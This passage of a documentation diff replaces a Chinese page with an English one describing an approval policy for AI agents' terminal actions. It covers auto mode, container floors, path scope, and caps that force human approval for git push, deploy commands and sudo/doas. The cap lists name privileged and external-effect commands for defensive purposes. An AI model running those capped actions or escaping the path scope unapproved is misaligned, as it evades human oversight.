-<p>当同一 PR 已被之前的一次执行合并（409 <code>pr_ja_mergeado</code>），或已有一个存活的提案——待处理、已批准或已自动批准（409 <code>merge_ja_proposto</code>）——时，<code>git_merge</code> 在创建之前即被<strong>拒绝</strong>；被拒绝或失败的提案不妨碍重试。批准一个其 PR 已被另一个提案合并的待处理合并同样是 409 <code>pr_ja_mergeado</code>，动作保持 <code>pending</code>。仍待处理的 QA/SecOps gate <strong>不是</strong>拒绝：PR 标签页和聊天只<strong>提示</strong>，点名该 gate，按钮保持可用
-（<a href="../business-rules/api.html#rn-663">RN-663</a>）。</p>
-<p>“自动模式”需要 <code>maintainer</code>——与通配符出现之前就保护
-<code>PUT .../agent-autonomy</code> 的角色相同。关闭它复用 agent 卡片在概览/执行者中已有的手动/自动开关：写入通配符后，开关改为编辑<strong>它</strong>而不是一贯的代表类型，其中的“手动”就是同一个通配符被重写为 <code>require_approval</code>。</p>
-<h3 id="容器下限rn-492rn-493adr-0134">容器下限（<a href="../business-rules/engine.html#rn-492">RN-492</a>/<a href="../business-rules/api.html#rn-493">RN-493</a>，<a href="../adr/0134-dev-agents-executam-dentro-do-container.html">ADR 0134</a>）</h3>
-<p>上图中的节点 <code>C0</code> 是新的：当动作是 <code>terminal</code> <strong>且</strong>项目在 <code>project_containers</code> 中有一个<strong>登记</strong>为 <code>running</code> 的容器
-（<code>execution_mode: container</code>——由 <code>ProposeActionUseCase</code> 检查，它已经读取执行侧读取的同一个容器生命周期）时，<strong>基础</strong>值不再是 <code>require_approval</code>，而以 <code>auto_approve</code> 开始。</p>
-<p>这是一个下限，不是新的上限，区别很重要：后续每一步
-（<code>agent_autonomy</code>、<code>permissions.json</code>）在有显式意见时本就会<strong>替换</strong>基础值——正是同一机制让 <code>deny</code> 规则或 <code>ask</code> 模式覆盖今天的默认 <code>require_approval</code>。从
-<code>auto_approve</code> 而不是 <code>require_approval</code> 出发不改变这一属性：显式的
-<code>deny</code> 或匹配的 <code>ask</code> 模式依旧胜过下限，正如它们胜过默认值。下面四个上限（<code>S</code>、<code>Z</code>、<code>H</code> 和复合命令规则）仍无条件地叠加在上面，无论 <code>auto_approve</code> 来自下限还是来自显式规则——在运行中的容器内 <code>git push</code> 依旧是 <code>require_approval</code>，一如既往。</p>
-<p><strong>为什么这是安全的：多了第二道更强的边界，而不是少了一道。</strong> 在容器之外，下面的<strong>词法</strong>路径范围
-（<code>comandoNoEscopo</code> 对照 <code>projectScopeRoot</code>，一个<strong>主机</strong>路径）是使通过 <code>permissions.json allow</code> 自动批准变得安全的东西。在真实容器内，命令物理上看不到 <code>/work</code> 之外的任何东西——Docker 的 mount namespace——而且 broker 在运行任何东西之前独立地重新验证 <code>cwd</code> 位于 <code>/work</code> 之内（<code>DiretorioForaDoEscopoError</code>）。<strong>词法路径范围继续在下限之上运行，没有变化</strong>：到达 <code>decide()</code> 的
-<code>cwd</code>/<code>command</code> 从不被转换为 <code>/work</code>（该转换稍后在 engine 一侧、就在调用 broker 之前发生），因此一个今天会被标记为超出范围的命令，在下限开启时依旧被标记为超出范围——这是冗余的纵深防御，而不是替代。</p>
-<h2 id="a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">外部效果与特权命令的边界（RN-418）</h2>
-<p><strong><a href="../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.html">ADR 0102</a>
-对 <a href="../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.html">ADR 0065</a>
-的修订</strong>——产品负责人一个<strong>全局</strong>且明确的决定，在一条关于该变更的自动安全警告之后得到确认（完整历史在 ADR 中）。下文描述<strong>当前</strong>行为；之前的版本（无条件 <code>deny</code>，在任何放行步骤之前应用）是被替换，而不是被放松——原因见下文。</p>
-<p><code>terminal</code> 命令中的 <code>git push</code>、<code>git remote add</code>/<code>set-url</code>、<code>git merge</code>、provider 的 CLI
-（<code>gh pr create</code>、<code>gh pr merge</code>、<code>glab mr create</code>/<code>merge</code>、release 和
-workflow dispatch）、常见的部署命令（<code>kubectl apply</code>、<code>helm upgrade</code>、<code>terraform apply</code>、<code>docker push</code>、<code>npm publish</code>……）以及现在的
-<code>sudo</code>/<code>doas</code> 都是<strong>绝对上限</strong>（并且自
-<a href="../business-rules/api.html#rn-689">RN-689</a> 起，<strong>有类型</strong>的动作
-<code>git_push</code> 和 <code>pr_open</code> 也是，此前通配符 <code>&quot;*&quot;</code>、具体规则或
-<code>permissions.json</code> 会把它们提升为 <code>auto_approve</code>）——与其他三个上限位于同一个最终块（见下方<a href="#caps">“上限”</a>），在
-<code>agent_autonomy</code> 和 <code>permissions.json</code> 已给出意见之后应用：如果到那时的裁定是 <code>auto_approve</code>，它就变为无条件的 <code>require_approval</code>。无论是“自动模式”的通配符
-<code>&quot;*&quot;</code> 还是 <code>permissions.json</code> 中的 <code>allow</code> 条目，都无法把它提升回去。</p>
-<p><strong>为什么现在 <code>require_approval</code> 是安全的，而以前需要 <code>deny</code>。</strong> <code>deny</code> 的历史原因很具体：“始终允许”会把模式写入
-<code>allow</code>，一次点击就足以永久重新打开这扇门。这个漏洞是在<strong>源头</strong>堵上的，而不是绕过：
+<p><strong>Node <code>Z</code> changed position</strong> (<a href="../business-rules/api.html#rn-418">RN-418</a>,
+revises <a href="../business-rules/api.html#rn-106">RN-106</a>): until the introduction of
+the local runner, it sat right after IAM and returned <code>deny</code> — now it's a
+CAP, in the same final block as the other three, applied after
+<code>agent_autonomy</code> and <code>permissions.json</code> have already given their opinion.
+See the section
+<a href="#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">&quot;The boundary of external effect and privileged command&quot;</a>
+below for why.</p>
+<h3 id="auto-mode-the-agent_autonomy-wildcard-rn-153">&quot;Auto mode&quot;: the <code>agent_autonomy</code> wildcard (<a href="../business-rules/api.html#rn-153">RN-153</a>)</h3>
+<p>The <code>agent_autonomy has an opinion?</code> node in the diagram above doesn't
+know, and doesn't need to know, whether the opinion came from a SPECIFIC
+rule (<code>actionType: &quot;terminal&quot;</code>) or from the <code>actionType: &quot;*&quot;</code> wildcard —
+&quot;auto mode&quot;: autonomy for ANY type of action by that agent, turned on with
+a click on &quot;Automatic mode&quot; in the <code>ApprovalCard</code>. The resolution happens
+BEFORE this diagram begins, in a single repository:
+<code>DrizzleAgentAutonomyRepository.findMode</code> looks up the specific rule and
+the wildcard in the same query, and returns the specific one when both
+exist — writing <code>terminal: deny</code> with <code>&quot;*&quot;: auto_approve</code> turned on still
+denies <code>terminal</code> for that agent, while freeing up the rest.</p>
+<p>That's why the diagram didn't get a new node, and the caps, right below,
+apply to &quot;auto mode&quot; because they react to <code>current.policy === 'auto_approve'</code>, never to its origin
+(<a href="../business-rules/api.html#rn-154">RN-154</a>).</p>
+<p><strong>One exception, decided by the product owner: auto mode frees the path
+scope</strong> (<a href="../business-rules/api.html#rn-603">RN-603</a>,
+<a href="../adr/0167-modo-automatico-libera-o-escopo-de-caminho.html">ADR 0167</a>).
+The repository also returns WHERE the autonomy came from
+(<code>AgentAutonomyRepository.resolve</code>: <code>especifica</code> or <code>curinga</code>), and
+<code>decide()</code> receives it as <code>ctx.autonomyOrigin</code>. When the wildcard resolves
+to <code>auto_approve</code>, two approval requests go away: the <a href="#path-scope">path-scope
+cap</a> and the <code>require_approval</code> a compound command synthesises
+for a segment with no rule at all. So an agent in auto mode runs any
+terminal command, even outside the project folder — measured on <code>exp001</code>,
+47 of 51 requests after auto mode was on came only from the scope, because
+the dev agent runs inside the container (<code>/work</code>) and the scope compares
+against the HOST root. Everything else stays: <code>deny</code> wins, an <code>ask</code> written
+in the file asks, the external-effect/privileged cap (push, PR, deploy,
+<code>sudo</code>/<code>doas</code>) runs first and ignores the origin, and protected-branch
+merge, <code>instruction_patch</code>, parallelism and <code>container_remove</code> never
+auto-approve. A SPECIFIC rule (<code>terminal: auto_approve</code> or
+<code>terminal: require_approval</code>) is not auto mode and keeps the scope cap.</p>
+<p>When a <code>git_merge</code> the human approved EXECUTES and the provider reports the PR
+as <code>merged</code>, the task that PR came from moves to <code>done</code> — once: a repeated merge
+of the same PR does not move it again or record a second
+<code>backlog.task_status_changed</code> event (<a href="../business-rules/api.html#rn-628">RN-628</a>). The
+merge itself is never automated (<a href="../business-rules/api.html#rn-418">RN-418</a>).</p>
+<p>A <code>git_merge</code> is REFUSED before it is created when the same PR was already
+merged by an earlier execution (409 <code>pr_ja_mergeado</code>) or already has a live
+proposal — pending, approved or auto-approved (409 <code>merge_ja_proposto</code>); a
+denied or failed one does not block trying again. Approving a pending merge
+whose PR another proposal already merged is also 409 <code>pr_ja_mergeado</code>, and the
+action stays <code>pending</code>. A QA/SecOps gate still pending is NOT a refusal: the
+PRs tab and the chat only WARN, naming the gate, and the button stays enabled
+(<a href="../business-rules/api.html#rn-663">RN-663</a>).</p>
+<p>&quot;Auto mode&quot; requires <code>maintainer</code> — the same role that already protected
+<code>PUT .../agent-autonomy</code> before the wildcard existed. Turning it off
+reuses the manual/auto toggle the agent card already had in
+Overview/Executors: with the wildcard written, the toggle switches to
+editing IT instead of the usual representative type, and &quot;manual&quot; on it is
+the same wildcard rewritten as <code>require_approval</code>.</p>
+<h3 id="the-container-floor-rn-492rn-493-adr-0134">The container floor (<a href="../business-rules/engine.html#rn-492">RN-492</a>/<a href="../business-rules/api.html#rn-493">RN-493</a>, <a href="../adr/0134-dev-agents-executam-dentro-do-container.html">ADR 0134</a>)</h3>
+<p>Node <code>C0</code> in the diagram above is new: when the action is <code>terminal</code> AND the
+project has a container REGISTERED as <code>running</code> in <code>project_containers</code>
+(<code>execution_mode: container</code> — checked by <code>ProposeActionUseCase</code>, which
+already reads the same container lifecycle the execution side reads), the
+BASE value stops being <code>require_approval</code> and starts as <code>auto_approve</code>.</p>
+<p>This is a floor, not a new cap, and the distinction matters: every stage
+that follows (<code>agent_autonomy</code>, <code>permissions.json</code>) already REPLACES the
+base value when it has an explicit opinion — that's the same mechanism
+that already let a <code>deny</code> rule or an <code>ask</code> pattern override the default
+<code>require_approval</code> today. Starting from <code>auto_approve</code> instead of
+<code>require_approval</code> doesn't change that property: an explicit <code>deny</code> or a
+matching <code>ask</code> pattern still wins over the floor exactly like it already
+won over the default. And the four caps below (<code>S</code>, <code>Z</code>, <code>H</code>, and the
+compound-command rule) keep applying on top, unconditionally, whether the
+<code>auto_approve</code> came from the floor or from an explicit rule — <code>git push</code>
+inside a running container is still <code>require_approval</code>, same as always.</p>
+<p><strong>Why this is safe: a second, stronger boundary, not the absence of one.</strong>
+Outside a container, the LEXICAL path scope below (<code>comandoNoEscopo</code>
+against <code>projectScopeRoot</code>, a HOST path) is what makes auto-approving via
+<code>permissions.json allow</code> safe. Inside the real container, the command
+physically cannot see anything outside <code>/work</code> — Docker's mount namespace
+— and the broker independently re-validates <code>cwd</code> is inside <code>/work</code>
+before running anything (<code>DiretorioForaDoEscopoError</code>). <strong>The lexical path
+scope still runs on top of the floor, unchanged</strong>: <code>cwd</code>/<code>command</code> reaching
+<code>decide()</code> are never translated to <code>/work</code> (that translation happens later,
+on the engine side, right before calling the broker), so a command that
+would be flagged out-of-scope today is still flagged out-of-scope with the
+floor on — it's redundant defense-in-depth, not a replacement.</p>
+<h2 id="a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">The boundary of external effect and privileged command (RN-418)</h2>
+<p><strong>Revision of <a href="../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.html">ADR 0065</a>
+by <a href="../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.html">ADR 0102</a></strong>
+— a GLOBAL and explicit decision by the product owner, confirmed after an
+automatic security warning about the change (the full history is in the
+ADR). What follows describes the CURRENT behavior; the previous version
+(unconditional <code>deny</code>, applied before any permissive stage) was replaced,
+not loosened — see why right below.</p>
+<p><code>git push</code>, <code>git remote add</code>/<code>set-url</code>, <code>git merge</code>, the provider CLIs
+(<code>gh pr create</code>, <code>gh pr merge</code>, <code>glab mr create</code>/<code>merge</code>, releases and
+workflow dispatch), common deploy commands (<code>kubectl apply</code>, <code>helm upgrade</code>, <code>terraform apply</code>, <code>docker push</code>, <code>npm publish</code>, ...) and now
+also <code>sudo</code>/<code>doas</code> in a <code>terminal</code> command are an <strong>ABSOLUTE CAP</strong> (and,
+since <a href="../business-rules/api.html#rn-689">RN-689</a>, so are the TYPED <code>git_push</code> and
+<code>pr_open</code> actions, which until then the <code>&quot;*&quot;</code> wildcard, a specific rule or
+<code>permissions.json</code> promoted to <code>auto_approve</code>) — in the
+same final block as the other three caps (see <a href="#caps">&quot;Caps&quot;</a> below),
+applied after <code>agent_autonomy</code> and <code>permissions.json</code> have already given
+their opinion: if the verdict up to that point was <code>auto_approve</code>, it
+becomes unconditional <code>require_approval</code>. Neither the <code>&quot;*&quot;</code> wildcard for
+&quot;automatic mode&quot; nor an <code>allow</code> entry in <code>permissions.json</code> can promote it
+back.</p>
+<p><strong>Why <code>require_approval</code> is now safe, when before it required <code>deny</code>.</strong>
+The historical reason for the <code>deny</code> was concrete: &quot;always allow&quot; writes
+the pattern into <code>allow</code>, and a single click would be enough to reopen the
+door forever. That gap was closed AT THE SOURCE, not worked around:
 <code>ApproveAlwaysActionUseCase</code>/<code>patternsForAction</code>
-（<code>src/application/use-cases/actions/approve-always-action.use-case.ts</code>）
-<strong>拒绝</strong>为有 git 外部效果或特权命令的终端动作把模式写入 <code>allow</code>——用户仍通过正常流程批准具体实例，但在这两种情况下“始终允许”从不写入模式。没有这种拒绝，上限就只是装饰。</p>
-<p><code>sudo</code>/<code>doas</code> 在 <code>external-effect.ts</code> 中获得了自己的类别
-（<code>comandoPrivilegiadoNoComando</code>），在任何片段中按<strong>动词</strong>匹配——与 git 的 <code>efeitoExternoNoComando</code> 同一原则，后者仍按<strong>词元前缀</strong>匹配，忽略中间的全局 flag（<code>git -C /tmp push</code> 匹配
-<code>git push</code>）。复合命令的每个片段都会被检查：<code>pnpm test &amp;&amp; git push origin main</code> 被第二个片段拦下，正如复合命令本就要求每个片段都匹配才能成为 <code>auto_approve</code>。</p>
-<p>上限并不剥夺 agent 的能力：对于 git，错误消息仍会指出应使用哪个<strong>有类型</strong>的动作——<code>git_push</code>、<code>git_merge</code> 或 <code>pr_open</code>——它以 <code>proposed_action</code> 诞生，走正常流水线，并在事件日志中记录发送了什么、发往何处（这是 dev agent 今天已经使用的路径，<code>agent_io.ex</code>）。<code>sudo</code>/<code>doas</code> 没有对应的有类型动作——消息只解释为什么该命令需要人工决定。</p>
-<p><strong>现在这一点最重要的地方</strong>：
-<a href="../adr/0103-runner-local-execucao-na-maquina-do-usuario.html">本地 runner</a>
-以用户的权限在用户自己的机器上执行<strong>已经</strong>批准的命令——这正是合法的 <code>sudo</code>（或试图借 <code>sudo</code> 逃逸）需要一个由构造而非 <code>permissions.json</code> 惯例保证的人工停顿的场景。</p>
-<p><strong><code>container_remove</code>（ADR 0136，<a href="../business-rules/api.html#rn-495">RN-495</a>）
-也进入同样的“始终允许”拒绝</strong>，其机制比上面的更简单：它不是按词元匹配的 <code>terminal</code> 命令，而是一个独立的
-<code>actionType</code>，所以 <code>ApproveAlwaysActionUseCase</code> 对该类型直接拒绝这次点击——不写入任何模式，用户通过正常流程批准具体实例。<code>container_start</code> 和 <code>container_stop</code> <strong>不</strong>会这样被拒绝：它们可以配置为 <code>auto_approve</code>，与
-<code>open_adr_pr</code>/<code>open_infra_pr</code> 同一量级——<code>container_stop</code> 从不被预置，而
-<code>container_start</code> 自 ADR 0190 起在 Infra agent 的 handoff 被接受时为其预置。</p>
-<p><strong>“始终允许”一次点击的顺序（<a href="../business-rules/api.html#rn-642">RN-642</a>）。</strong>
-批准与模式在<strong>同一</strong>事务中写入：模式（写入 <code>allow</code>，或对于模块 dev agent 写入 <code>agent_autonomy</code>）及其 <code>permission.granted</code> 事件只有在离开
-<code>pending</code> 的转换有效之后才写入，而模式写入失败会撤销批准。
-<code>permissions.json</code> 是文件，不进入事务——剩余窗口是文件写入后提交失败，这一点已声明。点击一个已因<strong>批准</strong>离开 <code>pending</code> 的动作（双击，同一个待处理动作显示在两个面板中）是幂等成功，
-<code>desfecho: &quot;ja_aprovada&quot;</code>，只在模式缺失时写入；点击一个<strong>已拒绝</strong>的动作仍是 <code>409</code>，带 <code>reason: &quot;acao_ja_recusada&quot;</code>，不写入任何东西。上面的上限在这一切之前检查，即使对已批准的动作也是如此。</p>
-<p><strong>上限的</strong>有类型<strong>一半（AT-320）。</strong> 直到 30/09，只有键入的命令
-<code>git push</code> 被拒绝；有类型的 <code>git_push</code> 动作会通过，并把
-<code>GitPush()</code> 写入 <code>allow</code>。“始终允许”现在按类型拒绝唯一的列表
-<code>TIPOS_SEM_SEMPRE_PERMITIR</code>
-（<code>src/domain/actions/sempre-permitir.ts</code>）：<code>git_push</code>、<code>pr_open</code>、
-<code>git_merge</code>、<code>container_remove</code>、<code>instruction_patch</code>、<code>parallelize</code> 和
-<code>raise_max_parallel</code>——<code>400</code>，带 <code>reason: &quot;teto_do_sempre_permitir&quot;</code>。审批卡片对同一列表隐藏按钮（一个由测试对照此列表核对的副本）。它加入时<strong>并未</strong>改变 <code>decide()</code>，也未改变激活执行时预置的内容；自 <a href="../business-rules/api.html#rn-689">RN-689</a> 起两者都变了：<code>git_push</code> 和 <code>pr_open</code> 在 <code>decide()</code> 中处于 RN-418 的上限之内
-（见<a href="#caps">“上限”</a>），而激活执行只为每个 <code>dev-&lt;modulo&gt;</code> 预置 <code>git_commit</code> 为
-<code>auto_approve</code>。</p>
-<p><strong>写入模式的单位：动词 + 子命令，每个片段一个
-（<a href="../business-rules/api.html#rn-675">RN-675</a>，负责人 01/10 的决定）。</strong> “始终允许”不再逐字节写入整个命令：命令的每个片段（按 <code>&amp;&amp;</code>、<code>||</code>、<code>;</code>、<code>|</code>、<code>&amp;</code> 拆分，与 <code>decide()</code> 的拆分方式一致）变成一个模式——当第二个词元是单词时为动词加子命令
-（<code>npm test</code>、<code>git status</code>、<code>mix test</code>、<code>npx vitest</code>），当它是一个非单词参数时只有动词（<code>cat src/x.ts</code> → <code>Terminal(cat)</code>，
-<code>cd ../lib</code> → <code>Terminal(cd)</code>），当第二个词元是 flag（<code>ls -la src</code>）或该单位会成为 RN-418 某个上限的前缀时则为<strong>精确</strong>片段
-（<code>git remote -v</code>、<code>gh pr list</code> 保持精确）。即使精确也是上限前缀的片段（单独的 <code>git</code>）不写入任何东西。<code>cd src/app &amp;&amp; npm test</code> 写入
-<code>Terminal(cd)</code> 和 <code>Terminal(npm test)</code>，下一个
-<code>cd lib/core &amp;&amp; npm test -- --coverage</code> 无需询问即可运行。匹配仍按词元前缀，上限仍在 <code>decide()</code> 中于文件之后运行，路径范围在自动模式之外仍然有效。模块 dev agent 的点击仍写入 <code>agent_autonomy</code>，而不是模式（<a href="../business-rules/api.html#rn-509">RN-509</a>）。</p>
-<h2 id="path-scope">路径范围</h2>
-<p><code>terminal</code> 命令还会按<strong>它触及何处</strong>来评估，而不只是按动词（<a href="../adr/0055-escopo-de-caminho-na-politica-de-terminal.html">ADR 0055</a>，
-<a href="../business-rules/api.html#rn-075">RN-075</a>）。项目文件夹——
-<code>&lt;PROJECT_WORKSPACES_ROOT&gt;/&lt;workspace_dir_name&gt;</code>，<code>permissions.json</code> 和所有 agent 的 worktree 都在其中——就是<strong>范围</strong>。
-<code>workspace_dir_name</code>
-（<a href="../adr/0066-nome-de-pasta-legivel-do-workspace.html">ADR 0066</a>，
-<a href="../business-rules/api.html#rn-109">RN-109</a>）是在项目创建时冻结的文件夹名——新项目中可读（<code>&lt;slug&gt;-&lt;id 的 8 个字符&gt;</code>），这次变更之前的项目中是纯 UUID。</p>
-<p><strong><code>local</code> 模式的项目有不同的范围，这一差异在这里很重要</strong>（<a href="../adr/0072-projeto-local-ou-container.html">ADR 0072</a>，
-<a href="../business-rules/api.html#rn-169">RN-169</a>/<a href="../business-rules/api.html#rn-170">RN-170</a>）：
-根变为<strong>用户在创建时键入的绝对路径</strong>，而不是
-<code>join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)</code>。</p>
-<p>本节描述的一切依然有效——范围收紧和放松的方式完全相同，<code>deny</code> 依旧最先胜出。改变的是它<strong>包含</strong>什么。而后果在 ADR 0072 中被毫不淡化地声明：<code>join</code> 的<strong>结构性</strong>约束——“无论这一列发生什么，结果都不会离开受管根”——对这些项目不复存在。取而代之的是创建时的校验（RN-170：绝对路径、无 <code>..</code>、存在、可写、绝不是系统根、绝不与 Brabo 的 checkout 重叠），以及在每次派生根时对同一谓词的<strong>词法</strong>再校验——使数据库中被直接篡改的一行不会变成 <code>/</code> 上的终端范围。</p>
-<p>路径比较是<strong>词法的，且不对输入使用正则</strong>：去掉末尾斜杠是一次 O(n) 扫描，而不是 <code>.replace(/\/+$/, '')</code>。旧模式被 CodeQL 标记为多项式 ReDoS（HIGH）——它迫使引擎尝试每个起始位置，在大量斜杠时退化为 O(n²)。这里的输入来自 agent 的命令，因此不是使用带回溯正则的地方。</p>
-<p>范围做两件相反的事，重要的是二者的组合：</p>
-<p><strong>收紧。</strong> 触及外部路径的命令永远不会被自动批准，无论动词是否在 <code>allow</code> 中。没有这一点，一个被允许的 <code>Terminal(cat)</code> 会自动执行 <code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code>——运行 agent 的平台代码——并触及其他项目的 worktree。</p>
-<p><strong>放松。</strong> 在范围之内，<code>cd</code> 不再是需要许可的动词：它本身就是范围的声明。没有这一点，总是发出 <code>cd &lt;caminho&gt; &amp;&amp; &lt;verbo&gt;</code> 的 dev agent 会撞上复合命令规则——每个片段都需要匹配——于是<strong>每个</strong>命令都会停下等待审批，无论动词是否被允许。</p>
-<p>值得理解的四个限制：</p>
+(<code>src/application/use-cases/actions/approve-always-action.use-case.ts</code>)
+REFUSE to write a pattern into <code>allow</code> for a terminal action with git
+external effect or a privileged command — the user still approves the
+specific instance through the normal flow, but &quot;always allow&quot; never writes
+the pattern for these two cases. Without this refusal, the cap would be
+decorative.</p>
+<p><code>sudo</code>/<code>doas</code> got their own category in <code>external-effect.ts</code>
+(<code>comandoPrivilegiadoNoComando</code>), matching by VERB in any segment — same
+principle as <code>efeitoExternoNoComando</code> for git, which continues matching by
+<strong>token prefix</strong>, ignoring global flags in the middle (<code>git -C /tmp push</code>
+matches <code>git push</code>). Each segment of a compound command is checked: <code>pnpm test &amp;&amp; git push origin main</code> is blocked by the second segment, the same
+way a compound command already requires every segment to match to become
+<code>auto_approve</code>.</p>
+<p>The cap doesn't take power away from the agent: for git, the error message
+keeps pointing to which <strong>typed</strong> action to use — <code>git_push</code>, <code>git_merge</code>
+or <code>pr_open</code> — which is born a <code>proposed_action</code>, follows the normal
+pipeline, and records in the event log what was pushed and to where (it's
+the path the dev agent already uses today, <code>agent_io.ex</code>). <code>sudo</code>/<code>doas</code>
+don't have an equivalent typed action — the message just explains why that
+command requires a human decision.</p>
+<p><strong>Where this matters most now</strong>: the
+<a href="../adr/0103-runner-local-execucao-na-maquina-do-usuario.html">local runner</a>
+executes ALREADY approved commands on the user's own machine, with their
+own privileges — it's exactly the scenario where a legitimate <code>sudo</code> (or
+an attempt to escape via <code>sudo</code>) needs a human stop guaranteed by
+construction, not by <code>permissions.json</code> convention.</p>
+<p><strong><code>container_remove</code> (ADR 0136, <a href="../business-rules/api.html#rn-495">RN-495</a>)
+joins the same &quot;always allow&quot; refusal</strong>, by a simpler mechanism than the
+one above: it isn't a <code>terminal</code> command matched by token, it's its own
+<code>actionType</code>, so <code>ApproveAlwaysActionUseCase</code> refuses the click outright
+for that type — no pattern is ever written, and the user approves the
+specific instance through the normal flow instead. <code>container_start</code> and
+<code>container_stop</code> are NOT refused this way: they can be configured
+<code>auto_approve</code>, same calibre as <code>open_adr_pr</code>/<code>open_infra_pr</code> —
+<code>container_stop</code> is never seeded, and <code>container_start</code> is seeded for the
+Infra agent on its handoff accept since ADR 0190.</p>
+<p><strong>Order of an &quot;always allow&quot; click (<a href="../business-rules/api.html#rn-642">RN-642</a>).</strong>
+The approval and the pattern are recorded in the SAME transaction: the
+pattern (in <code>allow</code>, or in <code>agent_autonomy</code> for a module dev agent) and its
+<code>permission.granted</code> event are written only after the transition out of
+<code>pending</code> is valid, and a pattern that fails to write undoes the approval.
+The <code>permissions.json</code> is a file and cannot join the transaction — the
+residual window is the commit failing after the file was written, declared.
+Clicking an action that already left <code>pending</code> by an APPROVAL (a double
+click, the same pending action shown in two panels) is idempotent success,
+<code>desfecho: &quot;ja_aprovada&quot;</code>, which records the pattern only if it is missing;
+clicking a DENIED action is still <code>409</code> with <code>reason: &quot;acao_ja_recusada&quot;</code>
+and writes nothing. The caps above are checked before any of this, even for
+an action that was already approved.</p>
+<p><strong>The TYPED half of the cap (AT-320).</strong> Until 30/09 only the typed-in
+<code>git push</code> command was refused; a typed <code>git_push</code> action went through and
+wrote <code>GitPush()</code> into <code>allow</code>. &quot;Always allow&quot; now refuses, by type, the
+single list <code>TIPOS_SEM_SEMPRE_PERMITIR</code>
+(<code>src/domain/actions/sempre-permitir.ts</code>): <code>git_push</code>, <code>pr_open</code>,
+<code>git_merge</code>, <code>container_remove</code>, <code>instruction_patch</code>, <code>parallelize</code> and
+<code>raise_max_parallel</code> — <code>400</code> with <code>reason: &quot;teto_do_sempre_permitir&quot;</code>. The
+approval card hides the button for the same list (a copy checked against
+this one by test). When it shipped, this did NOT change <code>decide()</code> nor what
+activating execution seeds; since <a href="../business-rules/api.html#rn-689">RN-689</a> both
+changed: <code>git_push</code> and <code>pr_open</code> are inside the RN-418 cap in <code>decide()</code>
+(see <a href="#caps">&quot;Caps&quot;</a>), and activating execution seeds only <code>git_commit</code> as
+<code>auto_approve</code> for each <code>dev-&lt;module&gt;</code>.</p>
+<p><strong>The unit of the recorded pattern: verb + subcommand, one per segment
+(<a href="../business-rules/api.html#rn-675">RN-675</a>, owner decision 01/10).</strong> &quot;Always
+allow&quot; no longer records the whole command byte by byte: each segment of
+the command (split on <code>&amp;&amp;</code>, <code>||</code>, <code>;</code>, <code>|</code>, <code>&amp;</code>, as <code>decide()</code> splits it)
+becomes one pattern — the verb plus its subcommand when the second token is
+a word (<code>npm test</code>, <code>git status</code>, <code>mix test</code>, <code>npx vitest</code>), the verb alone
+when it is an argument that is not a word (<code>cat src/x.ts</code> → <code>Terminal(cat)</code>,
+<code>cd ../lib</code> → <code>Terminal(cd)</code>), and the EXACT segment when the second token is
+a flag (<code>ls -la src</code>) or when the unit would be a prefix of an RN-418 cap
+(<code>git remote -v</code>, <code>gh pr list</code> stay exact). A segment that is a cap prefix
+even when exact (<code>git</code> alone) records nothing. <code>cd src/app &amp;&amp; npm test</code>
+records <code>Terminal(cd)</code> and <code>Terminal(npm test)</code>, and the next
+<code>cd lib/core &amp;&amp; npm test -- --coverage</code> runs without asking. Matching is
+still by token prefix, the caps still run after the file in <code>decide()</code>, and
+the path scope still applies outside auto mode. A module dev agent's click
+still goes to <code>agent_autonomy</code>, not to a pattern (<a href="../business-rules/api.html#rn-509">RN-509</a>).</p>
+<h2 id="path-scope">Path scope</h2>
+<p>A <code>terminal</code> command is also evaluated by <strong>where it touches</strong>, not just
+by the verb (<a href="../adr/0055-escopo-de-caminho-na-politica-de-terminal.html">ADR 0055</a>,
+<a href="../business-rules/api.html#rn-075">RN-075</a>). The project folder —
+<code>&lt;PROJECT_WORKSPACES_ROOT&gt;/&lt;workspace_dir_name&gt;</code>, where <code>permissions.json</code>
+and all agent worktrees live — is the <strong>scope</strong>. <code>workspace_dir_name</code>
+(<a href="../adr/0066-nome-de-pasta-legivel-do-workspace.html">ADR 0066</a>,
+<a href="../business-rules/api.html#rn-109">RN-109</a>) is the folder name frozen at
+project creation — readable (<code>&lt;slug&gt;-&lt;8 chars of the id&gt;</code>) in a new
+project, the plain UUID in a project from before that change.</p>
+<p><strong>A project in <code>local</code> mode has a different scope, and the difference
+matters here</strong> (<a href="../adr/0072-projeto-local-ou-container.html">ADR 0072</a>,
+<a href="../business-rules/api.html#rn-169">RN-169</a>/<a href="../business-rules/api.html#rn-170">RN-170</a>):
+the root becomes the <strong>absolute path the user typed at creation</strong>, not
+<code>join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)</code>.</p>
+<p>Everything this section describes still holds — the scope tightens and
+loosens exactly the same way, and <code>deny</code> still wins first. What changes is
+what it CONTAINS. And the consequence is declared without softening in ADR
+0072: the <strong>structural</strong> containment of the <code>join</code> — &quot;the result never
+leaves the managed root, whatever happens to the column&quot; — ceases to exist
+for these projects. What replaces it is the creation-time validation
+(RN-170: absolute, no <code>..</code>, existing, writable, never a system root, never
+overlapping the Brabo checkout), plus the LEXICAL revalidation of the same
+predicate on every derivation of the root — so that a row tampered with
+directly in the database doesn't turn into a terminal scope at <code>/</code>.</p>
+<p>Path comparison is <strong>lexical and without regex over the input</strong>: trimming
+trailing slashes is an O(n) scan, not <code>.replace(/\/+$/, '')</code>. The old
+pattern was flagged by CodeQL as polynomial ReDoS (HIGH) — it forces the
+engine to try every starting position, and degrades to O(n²) with many
+slashes. The input here comes from an agent command, so it's not a place
+for backtracking regex.</p>
+<p>The scope does two opposite things, and it's the combination that matters:</p>
+<p><strong>Tightens.</strong> A command that touches a path from outside is never
+auto-approved, no matter how much the verb is in <code>allow</code>. Without this, an
+allowed <code>Terminal(cat)</code> would auto-execute <code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code> — the platform
+code that runs the agent — and reach into other projects' worktrees.</p>
+<p><strong>Loosens.</strong> Within the scope, <code>cd</code> stops being a verb that needs
+permission: it's the scope declaration itself. Without this, the dev
+agent, which always emits <code>cd &lt;caminho&gt; &amp;&amp; &lt;verbo&gt;</code>, would run into the
